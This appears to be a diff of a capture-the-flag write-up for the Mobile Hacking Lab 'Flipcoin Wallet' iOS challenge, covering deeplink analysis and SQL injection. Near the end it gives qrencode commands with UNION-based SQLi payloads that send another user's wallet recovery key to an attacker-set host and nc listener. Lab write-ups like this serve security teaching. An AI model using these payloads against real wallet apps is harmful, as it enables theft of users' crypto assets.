@@ -1,18 +1,49 @@
+---
+title: Mobile Hacking Lab - Flipcoin Wallet
+description: "Welcome to the iOS Application Security Lab: SQL Injection Challenge. The challenge is centered around a fictious crypto currency flipcoin and its wallet Flipcoin Wallet. The Flipcoin wallet is an offline wallet giving users full ownership of their digital assets. The challenge highlights the potential entrypoints that can lead to further serious vulnerabilities including SQL injection. As an attacker, your aim is to craft an exploit that can be used to attack other users of the application."
+tags:
+  - SQLi
+  - SQLite
+  - strings
+  - otool
+  - objection
+  - rev-binaries
+  - uiopen
+  - MobileHackingLab
+  - ios
+keywords:
+  - ios hacking
+  - ctf writeup
+  - MHL
+  - MobileHackingLab
+  - Mobile Hacking Lab
+  - mobile writeups
+  - ios reversing
+  - ios exploitation
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Mobile%20Hacking%20Lab%20-%20Flipcoin%20Wallet/
+---
+
 **Description**: Welcome to the **iOS Application Security Lab: SQL Injection Challenge**. The challenge is centered around a fictious crypto currency flipcoin and its wallet Flipcoin Wallet. The Flipcoin wallet is an offline wallet giving users full ownership of their digital assets. The challenge highlights the potential entrypoints that can lead to further serious vulnerabilities including SQL injection. As an attacker, your aim is to craft an exploit that can be used to attack other users of the application.
 
 **Download**: https://lautarovculic.com/my_files/flipCoin-wallet.ipa
+
 **Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-flipcoin-wallet
 
 ![[flipCoin1.png]]
 
 Install an **IPA** file can be difficult.
+
 So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
+
 **LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE
 
 **NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.
 
 Once you have the app installed, let's proceed with the challenge.
+
 Unzip the **`.ipa`** file and inside we can find the **`Info.plist`** file.
+
 Here we can found an interesting info
 ```XML
 <array>
@@ -30,6 +61,7 @@ Here we can found an interesting info
 ```
 
 This is an **scheme** (for DeepLinks), which is handled with **`flipcoin`** word.
+
 Let's explore some related methods in the *binary file*.
 ```bash
 strings 'Flipcoin Wallet' | grep URL
@@ -47,24 +79,37 @@ scene:openURLContexts:
 ```
 
 We can see methods related to *URL handling*.
+
 What's is this?
+
 `application:openURL:sourceApplication:annotation:` -> for < iOS 9
+
 `application:openURL:options:` -> for > iOS 10
+
 But *since iOS 13* we use **UISceneDelegate**
 
 `openURL:options:completionHandler:`
+
 Used in multi-windows apps, UIScene, where each "*scene*" handle URL events by separated.
+
 Its used with **universal links**
 
 `scene:openURLContexts:`
+
 It's a recommended method in > iOS 13 for URL handling when app have many active scenes.
+
 This *replace* `application:openURL:options:`.
+
 Params:
+
 	- `scene`: Active scene where URL was opened.
+
 	- `openURLContext`: A *NSSet* with open URLs.
 
 #### Scene != Activity
+
 - An **Activity** in Android is a full screen with its own lifecycle.
+
 - A **Scene** in iOS is more flexible, it can represent a window, a tab, or a part of the UI in multi-window or multi-tasking apps.
 
 Let's use `otool` for decompile the methods, and search for them
@@ -85,9 +130,13 @@ Let's stop in this method
 _$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
 ```
 Clearly this is a **Swfit app**
+
 Here's the *structure*
+
 - `SceneDelegateC` → Refers to the *SceneDelegate* of the app (handles scenes in iOS 13+).
+
 - `scene_15openURLContexts` → Indicates that *it receives a UIScene* and a `NSSet<UIOpenURLContext>`, which is the method for *handling deep links in SceneDelegate*.
+
 - `So7UISceneC_ShySo16UIOpenURLContextCGtF` → It is using an *NSSet* of *UIOpenURLContext*, which confirms that it handles URLs opened from external links.
 
 An NSSet can be look as an simple *set* that we can see in python.
@@ -141,10 +190,13 @@ _$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16
 ```
 
 Now we need know how this method works, for that, we need use **Ghidra**.
+
 Load the binary file and let's search for the method!
 
 ![[flipCoin2.png]]
+
 This is an insane method which contains > 1000 code lines.
+
 Searching in the C code, we can notice something interesting.
 ```C
 [...]
@@ -217,19 +269,29 @@ else {
 [...]
 ```
 This code (can be seen at the end of the fragment) correspond to `SceneDelegate.swift`
+
 This file in an iOS app define how app **handle multiple windows (scenes)**.
+
 - Manages the **life cycle of the scene** (window)
+
 - Responds to **events such as opening URLs**, restoring app state, or handling external connections
+
 - Runs together with `AppDelegate.swift`, but handles each “scene” individually
 
 We can interpret the code in few words:
+
 1. Extracts the **URL from the `UIOpenURLContext`**
+
 2. Gets the **value of certain parameters**, such as **`amount`** and **`testnet`**, from the **URL**.
+
 3. **Validates if `testnet` is present,** and *if not*, allocates https://mhl.pages.dev:8545 as *fallback*
+
 4. *Frees objects in memory to avoid leaks*
 
 If we go to **Receive** functionality in app, we can see that a QR code is generated.
+
 Also, in **Send** functionality, we can notice that *our wallet* is
+
 `0x252B2Fff0d264d946n1004E581bb0a46175DC009`
 
 The deeplink looks like
@@ -272,11 +334,15 @@ Accept-Encoding: gzip, deflate
 Is interesting that we have the **ID** param. So, let's inspect the database implementation (due to this is an SQLi challenge).
 
 Well, searching code about the DB implementation, I get the flag
+
 ![[flipCoin3.png]]
+
 In the `createWallet` (`bool __thiscall Flipcoin_Wallet::DatabaseHelper::createWallets(DatabaseHelper *this)`)
 
 But, we need **exploit the SQLi**, so, we need know where and how the `.sqlite` file is create.
+
 So, we can use **objection** tool.
+
 Attach your device via USB and while app is running, execute
 ```bash
 objection -g "Flipcoin Wallet" explore
@@ -321,13 +387,16 @@ id|address|currency|amount|recovery_key
 ```
 
 We can see that we have `id`, `address`, `currency`, `amount`, `recovery_key` parameters.
+
 I think that the *sqli* is in the **amount** param.
+
 So, let's try generate a *new QR* for test it.
 
 ```bash
 qrencode "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001/**/AND/**/id=2;--&testnet=http://192.168.1.75:8081" -o QR3.png
 ```
 Remember set **nc** listener.
+
 Response:
 ```HTTP
 POST / HTTP/1.1
@@ -352,6 +421,7 @@ Accept-Encoding: gzip, deflate
 ```
 
 The SQLi works! because we get different wallet params.
+
 So, after many tries, this **UNION Based** payload works
 ```bash
 qrencode "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001/**/AND/**/id=10/**/UNION/**/SELECT/**/10,(SELECT/**/recovery_key/**/FROM/**/wallet/**/WHERE/**/id=2),3,4,5/**/LIMIT/**/1;--&testnet=http://192.168.1.75:8081" -o QR6.png
@@ -380,7 +450,9 @@ Accept-Encoding: gzip, deflate
 ```
 
 We get successfully the **recovery_key** of *the account 2*!
+
 **`BATTLE TOADS WRITING POEMS`**
+
 Also, if you want get the '*flag*' you just need *change the `WHERE` id=2 by id=1*.
 
 I hope you found it useful (:
